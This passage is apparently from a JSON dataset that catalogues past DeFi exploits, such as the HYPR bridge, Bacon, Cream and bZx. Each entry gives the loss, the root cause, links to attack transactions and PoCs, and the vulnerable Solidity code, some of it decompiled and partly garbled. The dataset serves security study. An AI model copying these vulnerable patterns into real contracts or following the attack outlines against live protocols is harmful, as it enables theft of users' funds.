            "https://explorer.phalcon.xyz/tx/eth/0x51ce3d9cfc85c1f6a532b908bb2debb16c7569eb8b76effe614016aac6635f65"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/HYPR_exp.sol",
        "analysis": [
            "https://x.com/BlockSecTeam/status/1735197818883588574",
            "https://blog.verichains.io/p/hypers-op-stack-bridge-exploit-analysis"
        ],
        "REF Link": "https://www.hypr.network/articles/incident-postmortem-bridge-exploit",
        "vulnerable_code_snippet": "// @notice Storage slot 0 holds a legacy value on upgraded networks. It is an empty placeholder slot on new networks. Manually set it to 0 so that 'Initializable' can use the first storage slot. This few lines of code helps to prevent a large diff in the source code to preserve the storage layout. This should be removed during the next contract upgrade.\nmodifier clearLegacySlot() {\n    assembly {\n        sstore(0, 0)\n    }\n    _;\n}\n\n// @notice Initializer\n// The fix modifier should be removed during the next contract upgrade.\nfunction initialize(CrossDomainMessenger _messenger) public clearLegacySlot reinitializer(2) {\n    __StandardBridge_init({_messenger: _messenger});\n} ... // @custom:legacy\n/// @notice Finalizes a withdrawal of ERC20 tokens from L2.\n/// @param _l1Token Address of the token on L1.\n/// @param _l2Token Address of the corresponding token on L2.\n/// @param _from Address of the withdrawer on L2.\n/// @param _to Address of the recipient on L1.\n/// @param _amount Amount of the ERC20 to withdraw.\n/// @param _extraData Optional data forwarded from L2.\nfunction finalizeERC20Withdrawal(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _extraData\n) external {\n    finalizeBridgeERC20(_l1Token, _l2Token, _from, _to, _amount, _extraData);\n} ... // @notice Finalizes a withdrawal of ERC20 tokens from L2.\nfunction finalizeBridgeERC20(\n    address _localToken,\n    address _remoteToken,\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _extraData\n) public onlyOtherBridge {\n    if (_isOptimismMintableERC20(_localToken)) {\n        require(\n            _isCorrectTokenPair(_localToken, _remoteToken),\n            \"StandardBridge: wrong remote token for Optimism Mintable ERC20 local token\"\n        );\n        OptimismMintableERC20(_localToken).mint(_to, _amount);\n    } else {\n        deposits[_localToken][_remoteToken] = deposits[_localToken][_remoteToken] - _amount;\n        IERC20(_localToken).safeTransfer(_to, _amount);\n    }\n    // Emit the correct events. By default this will be ERC20BridgeFinalized, but child\n    // contracts may override this function in order to emit legacy events as well.\n    _emitERC20BridgeFinalized(_localToken, _remoteToken, _from, _to, _amount, _extraData);\n} ... // @notice Ensures that the caller is a cross-chain message from the other bridge.\nmodifier onlyOtherBridge() {\n    require(\n        msg.sender == address(messenger) &&\n        messenger.xDomainMessageSender() == address(OTHER_BRIDGE),\n        \"StandardBridge: function can only be called from the other bridge\"\n    );\n    _;\n}"
    },
    {
        "type": "ERC777, Reentrancy, lending",
        "date": "20220305",
        "title": "Bacon Protocol",
        "fixed": true,
        "root_cause": "reentrancy in lend()",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220305-bacon-protocol---reentrancy",
        "lost": "$1 M",
        "attack_tx": null,
        "analysis": "Vulnerable code snippet:\n\nunverified contract\n[https://etherscan.io/address/0x781ad73f140815763d9a4d4752daf9203361d07d#code](https://etherscan.io/address/0x781ad73f140815763d9a4d4752daf9203361d07d#code)\n\nuset tokensReceived hook to reenter lend()\n\n---\nIssue fixed\n[https://etherscan.io/address/0xb827b209b388856f23845a56d8b34cf26fda171f#code#F1#L205](https://etherscan.io/address/0xb827b209b388856f23845a56d8b34cf26fda171f#code#F1#L205)",
        "vulnerable_code_snippet": "function lend(\n    uint256 amount\n) public nonReentrant returns (uint256) {\n    IERC20Upgradeable(ERCAddress).transferFrom(msg.sender, address(this), amount);\n\n    poolLent = poolLent.add(amount);\n\n    super._mint(msg.sender, amount);\n\n    return amount;\n}"          
    },
    {
        "type": "Access Control, ERC721",
        "date": "20210607",
        "title": "88mph",
        "root_cause": "Incorrect access control. Contract init function without modifier check and there was also no initializer modifier to prevent a re-initialization. Anyone could have taken ownership of the NFT contract",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210607-88mph-nft---access-control",
        "attack_tx": null,
        "analysis": "Contract init function without modifier check and there was also no initializer modifier to prevent a re-initialization. Anyone could have taken ownership of the NFT contract.",
        "vulnerable_code": "https://etherscan.io/address/0xF0b7DE03134857391d8D43Ed48e20EDF21461097#code#F14#L39",
        "fixed": true,
        "vulnerable_code_snippet": "function init(  //vulnerable point, without modifier check\n        address newOwner,\n        string calldata tokenName,\n        string calldata tokenSymbol\n    ) external {\n        _transferOwnership(newOwner);\n        _tokenName = tokenName;\n        _tokenSymbol = tokenSymbol;\n\n        // register the supported interfaces to conform to ERC721 via ERC165\n        _registerInterface(_INTERFACE_ID_ERC721_METADATA);\n\n        // Derived contracts need only register support for their own interfaces,\n        // we register support for ERC165 itself here\n        _registerInterface(_INTERFACE_ID_ERC165);\n\n        // register the supported interfaces to conform to ERC721 via ERC165\n        _registerInterface(_INTERFACE_ID_ERC721);\n    }"
    },
    {
        "type": "Flashloans",
        "date": "20230704",
        "title": "BaoCommunity",
        "root_cause": "Precision loss issue (Round error) in compound V2. The attacker manipulated the exchange rate, borrowed a significant amount of baoETH, depleted the liquidity pool on Balancer, and converted it into wETH.",
        "attack_tx": "https://etherscan.io/tx/0xdd7dd68cd879d07cfc2cb74606baa2a5bf18df0e3bda9f6b43f904f4f7bbdfc1",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Bao_exp.sol",
        "analysis": [
            "https://twitter.com/PeckShieldAlert/status/1676224397248454657",
            "https://medium.com/baomunity/analysis-and-response-to-the-july-4th-baoeth-exploit-3d60b886fcce"
        ],
        "lost": "$46k",
        "vulnerable_code_snippet": "(vars.mathErr, vars.redeemTokens) = divScalarByExpTruncate(redeemAmountIn, Exp({mantissa: vars.exchangeRateMantissa}));\n            if (vars.mathErr != MathError.NO_ERROR) {\n                return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_AMOUNT_CALCULATION_FAILED, uint(vars.mathErr));\n            }"
    },
    {
        "type": "Access Control",
        "date": "20240122",
        "title": "DAO_SoulMate",
        "root_cause": "The attacker exploited a vulnerability where anyone could call the redeem() function to burn $BUI tokens held by the contract and obtain the corresponding underlying assets.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0x1ea0a2e88efceccb2dd93e6e5cb89e5421666caeefb1e6fc41b68168373da342",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/DAO_SoulMate_exp.sol",
        "analysis": "https://twitter.com/MetaSec_xyz/status/1749743245599617282",
        "lost": "319K"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20221201",
        "lost": "$6k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/APC_exp.sol",
        "title": "APC",
        "root_cause": "Incorrect price calculation via getReverse. APC price relies on the reserve balances of the corresponding PancakeSwap pair. You dump APC token price by flashloan.",
        "attack_tx": [
            "https://explorer.phalcon.xyz/tx/bsc/0xbcaecea2044101c80f186ce5327bec796cd9e054f0c240ddce93e2aead337370",
            "https://explorer.phalcon.xyz/tx/bsc/0xf2d4559aeb945fb8e4304da5320ce6a2a96415aa70286715c9fcaf5dbd9d7ed2"
        ],
        "analysis": "https://twitter.com/BlockSecTeam/status/1598262002010378241",
        "vulnerable_code_snippet": "function x207() private {\n    v0, v1, v2, v3 = stor_c9_19.getReserves().gas(msg.gas);\n    require(v0); // checks call status, propagates error data on error\n    require(MEM[64] + RETURNDATASIZE() >= 96);\n    require(v1 == v1 & 0xffffffff);\n    require(v2 == v2 & 0xffffffff);\n    require(v3 == uint32(v3));\n    v4, v5 = 0x10ed43c718714eb63d5aa57b78b54704e256024e.FULLEXTENDED(v1 & 0xffffffff, v2 & 0xffffffff).gas(msg.gas);\n    require(v4); // checks call status, propagates error data on error\n    require(MEM[64] + RETURNDATASIZE() >= 32);\n    return v5;\n}\n\nfunction x4c3(uint256 varg0, uint256 varg1, uint256 varg2) private {\n    v0 = stor_c9_19 == address(varg2);\n    if (stor_c9_19 != address(varg2)) {\n        v0 = stor_cb_19 == address(varg2);\n    }\n    require(v0, Error('inputToken address wrong'));\n    v0 = x207();\n    if (stor_c9_19 != address(varg2)) {\n        if (stor_cb_19 == address(varg2)) {\n            x99d(varg0, this, msg.sender, stor_cb_19);\n            v4 = _SafeMul(v3, varg0);\n            require(v4, Panic(18));\n            v5 = SafeMul(99, v4 / v5);\n            require(v5, Panic(18));\n            emit Swap(msg.sender, stor_cb_19, stor_c9_19, varg0, v5 / 100);\n        } else {\n            x99d(varg0, this, msg.sender, stor_c9_19);\n            v6 = _SafeMul(v5, varg2);\n            require(v6, Panic(18));\n            v7 = SafeMul(99, v6 / v3);\n            require(v7, Panic(18));\n            emit Swap(msg.sender, stor_c9_19, stor_cb_19, varg0, v7 / 100);\n        }\n    }\n    return;\n} ... function swap(address varg0, address varg1, uint256 varg2) public payable {\n    require(msg.data.length - 4 >= 96);\n    require(varg0 == varg0);\n    require(varg1 == varg1);\n    0x4c3(varg2, varg1, varg0);\n}"
    },
    {
        "type": "Business Logic Flaw, Reentrancy",
        "date": "20230916",
        "title": "uniclyNFT",
        "root_cause": "For the first step, the attacker deployed a malicious contract, swapped 0.5 ETH for 3528 uJENNY tokens, and deposited them to `PointFarm` to accumulate initial rewards. Two days later, the attacker launched the actual attack exploiting two bugs:\n1. The deposit function allows a 0 `_amount` for minting new tokens.\n2. `user.rewardDebt` is updated only after the external call to ERC1155 callback.\n\nDuring withdrawal, the attacker could only retrieve their initial deposit since `user.amount` wasn't updated during the reentrancy. Instead, they used their inflated balance in PointFarm to redeem a LootRealms NFT in the PointShop contract. This is a classic reentrancy vulnerability that does not follow the check-effect-interaction pattern.",
        "attack_tx": "https://etherscan.io/tx/0xc42fe1ce2516e125a386d198703b2422aa0190b25ef6a7b0a1d3c6f5d199ffad",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/uniclyNFT_exp.sol",
        "analysis": "https://twitter.com/DecurityHQ/status/1703096116047421863",
        "vulnerable_code_snippet": "function deposit(uint256 _pid, uint256 _amount) public {\n    PoolInfo storage pool = poolInfo[_pid];\n    UserInfo storage user = userInfo[_pid][msg.sender];\n    updatePool(_pid);\n    if (user.amount > 0) {\n        uint256 pending = user.amount.mul(pool.accPointsPerShare).div(1e18).sub(user.rewardDebt);\n        if (pending > 0) {\n            bytes memory data;\n            _mint(msg.sender, _pid, pending, data);\n        }\n    }\n    if (_amount > 0) {\n        pool.uToken.safeTransferFrom(address(msg.sender), address(this), _amount);\n        user.amount = user.amount.add(_amount);\n    }\n    user.rewardDebt = user.amount.mul(pool.accPointsPerShare).div(1e18);\n    emit Deposit(msg.sender, _pid, _amount);\n}"
    },
    {
        "type": "Inflation Attack",
        "date": "20231202",
        "title": "bZxProtocol",
        "root_cause": "Empty pool forked bug. By depositing a small amount of tokens to obtain pool tokens,we can front-run other depositors' transactions and inflate the price of pool tokens through a substantial 'donation'. Consequently, the attacker can withdraw a greater quantity of tokens than they initially possessed.",
        "attack_tx": [
            "https://etherscan.io/tx/0x0fc5c0d41e5506fdb9434fab4815a4ff671afc834e47a533b3bed7182ece73b0",
            "https://etherscan.io/tx/0xb072f2e88058c147d8ff643694b43a42e36525b7173ce1daf76e6c06170b0e77"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/bZx_exp.sol",
        "analysis": "![Untitled](Inflation%20Attack%20d3fbb227030c4c799dba24a2f30d6393/Untitled.png)\n\n[https://x.com/kankodu/status/1771229163942474096](https://x.com/kankodu/status/1771229163942474096)\n\n![Untitled](Inflation%20Attack%20d3fbb227030c4c799dba24a2f30d6393/Untitled%201.png)",
        "lost": "$208k",
        "vulnerable_code_snippet":"/* * Copyright 2017-2020, bZeroX, LLC <https://bzx.network/>. All Rights Reserved. * Licensed under the Apache License, Version 2.0. */ pragma solidity 0.5.17; interface IWeth { function deposit() external payable; function withdraw(uint256 wad) external; } contract IERC20 { string public name; uint8 public decimals; string public symbol; function totalSupply() public view returns (uint256); function balanceOf(address _who) public view returns (uint256); function allowance(address _owner, address _spender) public view returns (uint256); function approve(address _spender, uint256 _value) public returns (bool); function transfer(address _to, uint256 _value) public returns (bool); function transferFrom(address _from, address _to, uint256 _value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); } contract IWethERC20 is IWeth, IERC20 {} /** * @dev Wrappers over Solidity's arithmetic operations with added overflow * checks. * * Arithmetic operations in Solidity wrap on overflow. This can easily result * in bugs, because programmers usually assume that an overflow raises an * error, which is the standard behavior in high level programming languages. * `SafeMath` restores this intuition by reverting the transaction when an * operation overflows. * * Using this library instead of the unchecked operations eliminates an entire * class of bugs, so it's recommended to use it always. */ library SafeMath { /** * @dev Returns the addition of two unsigned integers, reverting on * overflow. * * Counterpart to Solidity's `+` operator. * * Requirements: * - Addition cannot overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, \"SafeMath: addition overflow\"); return c; } /** * @dev Returns the subtraction of two unsigned integers, reverting on * overflow (when the result is negative). * * Counterpart to Solidity's `-` operator. * * Requirements: * - Subtraction cannot overflow. */ function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, \"SafeMath: subtraction overflow\"); } /** * @dev Returns the subtraction of two unsigned integers, reverting with custom message on * overflow (when the result is negative). * * Counterpart to Solidity's `-` operator. * * Requirements: * - Subtraction cannot overflow. * * _Available since v2.4.0._ */ function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } /** * @dev Returns the multiplication of two unsigned integers, reverting on * overflow. * * Counterpart to Solidity's `*` operator. * * Requirements: * - Multiplication cannot overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, \"SafeMath: multiplication overflow\"); return c; } /** * @dev Returns the integer division of two unsigned integers. Reverts on * division by zero. The result is rounded towards zero. * * Counterpart to Solidity's `/` operator. Note: this function uses a * `revert` opcode (which leaves remaining gas untouched) while Solidity * uses an invalid opcode to revert (consuming all remaining gas). * * Requirements: * - The divisor cannot be zero. */ function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, \"SafeMath: division by zero\"); } /** * @dev Returns the integer division of two unsigned integers. Reverts with custom message on * division by zero. The result is rounded towards zero. * * Counterpart to Solidity's `/` operator. Note: this function uses a * `revert` opcode (which leaves remaining gas untouched) while Solidity * uses an invalid opcode to revert (consuming all remaining gas). * * Requirements: * - The divisor cannot be zero. * * _Available since v2.4.0._ */ function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); uint256 c = a / b; return c; } /** * @dev Integer division of two numbers, rounding up and truncating the quotient */ function divCeil(uint256 a, uint256 b) internal pure returns (uint256) { return divCeil(a, b, \"SafeMath: division by zero\"); } /** * @dev Integer division of two numbers, rounding up and truncating the quotient */ function divCeil(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); if (a == 0) { return 0; } uint256 c = ((a - 1) / b) + 1; return c; } /** * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo), * Reverts when dividing by zero. * * Counterpart to Solidity's `%` operator. This function uses a `revert` * opcode (which leaves remaining gas untouched) while Solidity uses an * invalid opcode to revert (consuming all remaining gas). * * Requirements: * - The divisor cannot be zero. */ function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, \"SafeMath: modulo by zero\"); } /** * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo), * Reverts with custom message when dividing by zero. * * Counterpart to Solidity's `%` operator. This function uses a `revert` * opcode (which leaves remaining gas untouched) while Solidity uses an * invalid opcode to revert (consuming all remaining gas). * * Requirements: * - The divisor cannot be zero. * * _Available since v2.4.0._ */ function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; } function min256(uint256 _a, uint256 _b) internal pure returns (uint256) { return _a < _b ? _a : _b; } } /** * @title SignedSafeMath * @dev Signed math operations with safety checks that revert on error. */ library SignedSafeMath { int256 constant private _INT256_MIN = -2**255; /** * @dev Returns the multiplication of two signed integers, reverting on * overflow. * * Counterpart to Solidity's `*` operator. * * Requirements: * - Multiplication cannot overflow. */ function mul(int256 a, int256 b) internal pure returns (int256) { if (a == 0) { return 0; } require(!(a == -1 && b == _INT256_MIN), \"SignedSafeMath: multiplication overflow\"); int256 c = a * b; require(c / a == b, \"SignedSafeMath: multiplication overflow\"); return c; } /** * @dev Returns the integer division of two signed integers. Reverts on * division by zero. The result is rounded towards zero. * * Counterpart to Solidity's `/` operator. Note: this function uses a * `revert` opcode (which leaves remaining gas untouched) while Solidity * uses an invalid opcode to revert (consuming all remaining gas). * * Requirements: * - The divisor cannot be zero. */ function div(int256 a, int256 b) internal pure returns (int256) { require(b != 0, \"SignedSafeMath: division by zero\"); require(!(b == -1 && a == _INT256_MIN), \"SignedSafeMath: division overflow\"); int256 c = a / b; return c; } /** * @dev Returns the subtraction of two signed integers, reverting on * overflow. * * Counterpart to Solidity's `-` operator. * * Requirements: * - Subtraction cannot overflow. */ function sub(int256 a, int256 b) internal pure returns (int256) { int256 c = a - b; require((b >= 0 && c <= a) || (b < 0 && c > a), \"SignedSafeMath: subtraction overflow\"); return c; } /** * @dev Returns the addition of two signed integers, reverting on * overflow. * * Counterpart to Solidity's `+` operator. * * Requirements: * - Addition cannot overflow. */ function add(int256 a, int256 b) internal pure returns (int256) { int256 c = a + b; require((b >= 0 && c >= a) || (b < 0 && c < a), \"SignedSafeMath: addition overflow\"); return c; } } /** * @title Helps contracts guard against reentrancy attacks. * @author Remco Bloemen <remco@2π.com>, Eenae <alexey@mixbytes.io> * @dev If you mark a function `nonReentrant`, you should also * mark it `external`. */ contract ReentrancyGuard { /// @dev Constant for unlocked guard state - non-zero to prevent extra gas costs. /// See: https://github.com/OpenZeppelin/openzeppelin-solidity/issues/1056 uint256 internal constant REENTRANCY_GUARD_FREE = 1; /// @dev Constant for locked guard state uint256 internal constant REENTRANCY_GUARD_LOCKED = 2; /** * @dev We use a single lock for the whole contract. */ uint256 internal reentrancyLock = REENTRANCY_GUARD_FREE; /** * @dev Prevents a contract from calling itself, directly or indirectly. * If you mark a function `nonReentrant`, you should also * mark it `external`. Calling one `nonReentrant` function from * another is not supported. Instead, you can implement a * `private` function doing the actual work, and an `external` * wrapper marked as `nonReentrant`. */ modifier nonReentrant() { require(reentrancyLock == REENTRANCY_GUARD_FREE, \"nonReentrant\"); reentrancyLock = REENTRANCY_GUARD_LOCKED; _; reentrancyLock = REENTRANCY_GUARD_FREE; } } /** * @dev Collection of functions related to the address type */ library Address { /** * @dev Returns true if `account` is a contract. * * [IMPORTANT] * ==== * It is unsafe to assume that an address for which this function returns * false is an externally-owned account (EOA) and not a contract. * * Among others, `isContract` will return false for the following  * types of addresses: * *  - an externally-owned account *  - a contract in construction *  - an address where a contract will be created *  - an address where a contract lived, but was destroyed * ==== */ function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != accountHash && codehash != 0x0); } /** * @dev Converts an `address` into `address payable`. Note that this is * simply a type cast: the actual underlying value is not changed. * * _Available since v2.4.0._ */ function toPayable(address account) internal pure returns (address payable) { return address(uint160(account)); } /** * @dev Replacement for Solidity's `transfer`: sends `amount` wei to * `recipient`, forwarding all available gas and reverting on errors. * * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost * of certain opcodes, possibly making contracts go over the 2300 gas limit * imposed by `transfer`, making them unable to receive funds via * `transfer`. {sendValue} removes this limitation. * * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more]. * * IMPORTANT: because control is transferred to `recipient`, care must be * taken to not create reentrancy vulnerabilities. Consider using * {ReentrancyGuard} or the * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern]. * * _Available since v2.4.0._ */ function sendValue(address recipient, uint256 amount) internal { require(address(this).balance >= amount, \"Address: insufficient balance\"); (bool success, ) = recipient.call.value(amount)(''); require(success, \"Address: unable to send value, recipient may have reverted\"); } } /* * @dev Provides information about the current execution context, including the * sender of the transaction and its data. While these are generally available * via msg.sender and msg.data, they should not be accessed in such a direct * manner, since when dealing with GSN meta-transactions the account sending and * paying for execution may not be the actual sender (as far as an application * is concerned). * * This contract is only required for intermediate, library-like contracts. */ contract Context { constructor () internal { } function _msgSender() internal view returns (address payable) { return msg.sender; } function _msgData() internal view returns (bytes memory) { this; return msg.data; } } /** * @dev Contract module which provides a basic access control mechanism, where * there is an account (an owner) that can be granted exclusive access to * specific functions. * * This module is used through inheritance. It will make available the modifier * `onlyOwner`, which can be applied to your functions to restrict their use to * the owner. */ contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); /** * @dev Initializes the contract setting the deployer as the initial owner. */ constructor () internal { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } /** * @dev Returns the address of the current owner. */ function owner() public view returns (address) { return _owner; } /** * @dev Throws if called by any account other than the owner. */ modifier onlyOwner() { require(isOwner(), \"unauthorized\"); _; } /** * @dev Returns true if the caller is the current owner. */ function isOwner() public view returns (bool) { return _msgSender() == _owner; } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Can only be called by the current owner. */ function transferOwnership(address newOwner) public onlyOwner { _transferOwnership(newOwner); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). */ function _transferOwnership(address newOwner) internal { require(newOwner != address(0), \"Ownable: new owner is the zero address\"); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; } } contract Pausable { bytes32 internal constant Pausable_FunctionPause = 0xa7143c84d793a15503da6f19bf9119a2dac94448ca45d77c8bf08f57b2e91047; modifier pausable(bytes4 sig) { require(!_isPaused(sig), \"unauthorized\"); _; } function _isPaused(bytes4 sig) internal view returns (bool isPaused) { bytes32 slot = keccak256(abi.encodePacked(sig, Pausable_FunctionPause)); assembly { isPaused := sload(slot) } } } contract LoanTokenBase is ReentrancyGuard, Ownable, Pausable { uint256 internal constant WEI_PRECISION = 10**18; uint256 internal constant WEI_PERCENT_PRECISION = 10**20; int256 internal constant sWEI_PRECISION = 10**18; string public name; string public symbol; uint8 public decimals; uint88 internal lastSettleTime_; address public loanTokenAddress; uint256 public baseRate; uint256 public rateMultiplier; uint256 public lowUtilBaseRate; uint256 public lowUtilRateMultiplier; uint256 public targetLevel; uint256 public kinkLevel; uint256 public maxScaleRate; uint256 internal _flTotalAssetSupply; uint256 public checkpointSupply; uint256 public initialPrice; mapping (uint256 => bytes32) public loanParamsIds; mapping (address => uint256) internal checkpointPrices_; } contract AdvancedTokenStorage is LoanTokenBase { using SafeMath for uint256; event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); event Mint(address indexed minter, uint256 tokenAmount, uint256 assetAmount, uint256 price); event Burn(address indexed burner, uint256 tokenAmount, uint256 assetAmount, uint256 price); mapping(address => uint256) internal balances; mapping (address => mapping (address => uint256)) internal allowed; uint256 internal totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } } contract LoanToken is AdvancedTokenStorage { address internal target_; constructor(address _newOwner, address _newTarget) public { transferOwnership(_newOwner); _setTarget(_newTarget); } function() external payable { if (gasleft() <= 2300) { return; } address target = target_; bytes memory data = msg.data; assembly { let result := delegatecall(gas, target, add(data, 0x20), mload(data), 0, 0) let size := returndatasize let ptr := mload(0x40) returndatacopy(ptr, 0, size) switch result case 0 { revert(ptr, size) } default { return(ptr, size) } } } function setTarget(address _newTarget) public onlyOwner { _setTarget(_newTarget); } function _setTarget(address _newTarget) internal { require(Address.isContract(_newTarget), \"target not a contract\"); target_ = _newTarget; } }"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230308",
        "lost": "$80K",
        "title": "DKP",
        "root_cause": "The contract was not verified. So, after decompiling it, we found that the vulnerability was present in the exchange() function, which was used to swap USDT for DKP tokens. The problem arises because the price Oracle relies on the balance ratio of the two tokens in the USDT-DKP pair, making it vulnerable to flash loan attacks that allow the attacker to manipulate the pool.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DKP_exp.sol",
        "attack_tx": [
            "https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271",
            "https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01"
        ],
        "analysis": [
            "https://twitter.com/CertiKAlert/status/1633421908996763648",
            "https://blog.solidityscan.com/dkp-hack-analysis-improper-token-pair-ratio-calculation-282672cd0450",
            "https://medium.com/coinmonks/decoding-dkp-token-s-80k-exploit-quillaudits-45c67df973d6"
        ],
        "vulnerable_code_snippet": "function exchange(uint256 varg0) public payable {\n    require(4 + (msg.data.length - 4) >= 32);\n    require(msg.sender.code.size > 0, Error('no isContract'));\n    require(varg0 >= stor_9, Error('num >= proper'));\n    v0 = _SafeAdd(varg0, owner[msg.sender]);\n    owner[msg.sender] = v0;\n    0xa169(varg0, stor_10, msg.sender, _usdt);\n    require(owner[6].code.size);\n    (v1, v3, v8) = owner_e_0_a9.staticcall(0x0bds2903, msg.sender).gas(msg.gas);\n    require(v1); // checks call status, propagates error data on error\n    require(MEM[64] + RETURNDATASIZE() >= 96);\n    v2 = 0x2a16(v2);\n    v5 = 0x1201();\n    v6 = 0x1aF2(varg0, v5);\n    v7 = 0x1b6d(0x0de0b6b3a7640000, v6);\n    v8 = v9 = 0;\n    if (address(v2) != 0) {\n        // logic here\n    }\n    if (address(v3) != 0) {\n        // logic here\n    }\n    if (address(v4) != 0) {\n        // logic here\n        0x1aF4(stor_8, v7);\n        0x1b6d(_exchange, v2);\n    }\n    // additional logic\n    v2 = SafeSub(v2, v7);\n    // emit event or return statement\n    emit Swap(msg.sender, stor_3_19);\n} ... function 0x1201() private { \n    require(stor_3_0_19.code.size);\n    (v0, v1) = stor_3_0_19.balanceOf(_lp).gas(msg.gas);\n    require(v0); // checks call status, propagates error data on error\n    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);\n    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);\n    0x2a44(v1);\n    require(_usdt.code.size);\n    (v2, v3) = _usdt.balanceOf(_lp).gas(msg.gas);\n    require(v2); // checks call status, propagates error data on error\n    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);\n    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);\n    0x2a44(v3);\n    v4 = 0x1af2(0xde0b6b3a7640000, v1);\n    v5 = 0x1b6d(v3, v4);\n    return v5;\n}"        
    },
    {
        "type": "ERC777, Reentrancy, lending",
        "date": "20210830",
        "lost": "$18 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210830-cream-finance---flashloan-attack--reentrancy",
        "title": "Cream Finance",
        "root_cause": "Reentrancy via ERC777 hook. Use tokensReceived hook to reenter borrow()",
        "vulnerable_code": [
            "https://etherscan.io/address/0x96cc0f947b6c8f4675159ea03144f8c17d5a2fc8#code#F1#L79",
            "https://etherscan.io/address/0xfF20817765cB7f73d4bde2e66e067E58D11095C2#code#L1671"
        ],
        "analysis": "use tokensReceived hook to reenter borrow()",
        "vulnerable_code_snippet": "function borrow(uint256 borrowAmount) external returns (uint256) {\n    return borrowInternal(borrowAmount, false);\n}\n\nfunction _transferByPartition(\n    bytes32 _fromPartition,\n    address _operator,\n    address _from,\n    address _to,\n    uint256 _value,\n    bytes memory _data,\n    bytes memory _operatorData\n) internal returns (bytes32) {\n    require(_to != address(0), EC_57_INVALID_RECEIVER);\n\n    // If the `_operator` is attempting to transfer from a different `_from`\n    // address, first check that they have the requisite operator or\n    // allowance permissions.\n    if (_from != _operator) {\n        require(\n            _isOperatorForPartition(_fromPartition, _operator, _from) ||\n            (_value <= _allowedByPartition[_fromPartition][_from][_operator]),\n            EC_53_INSUFFICIENT_ALLOWANCE\n        );\n\n        // If the sender has an allowance for the partition, that should\n        // be decremented\n        if (_allowedByPartition[_fromPartition][_from][_operator] >= _value) {\n            _allowedByPartition[_fromPartition][_from][msg.sender] = _allowedByPartition[_fromPartition][_from][_operator].sub(\n                _value\n            );\n        } else {\n            _allowedByPartition[_fromPartition][_from][_operator] = 0;\n        }\n    }\n\n    _callPreTransferHooks( //vulnerable point, call hook\n        _fromPartition,\n        _operator,\n        _from,\n        _to,\n        _value,\n        _data,\n        _operatorData\n    );\n\n    require(\n        _balanceOfByPartition[_from][_fromPartition] >= _value,\n        EC_52_INSUFFICIENT_BALANCE\n    );\n\n    bytes32 toPartition = PartitionUtils._getDestinationPartition(\n        _data,\n        _fromPartition\n    );\n\n    _removeTokenFromPartition(_from, _fromPartition, _value);\n    _addTokenToPartition(_to, toPartition, _value);\n    _callPostTransferHooks(\n        toPartition,\n        _operator,\n        _from,\n        _to,\n        _value,\n        _data,\n        _operatorData\n    );\n\n    emit Transfer(_from, _to, _value);\n    emit TransferByPartition(\n        _fromPartition,\n        _operator,\n        _from,\n        _to,\n        _value,\n        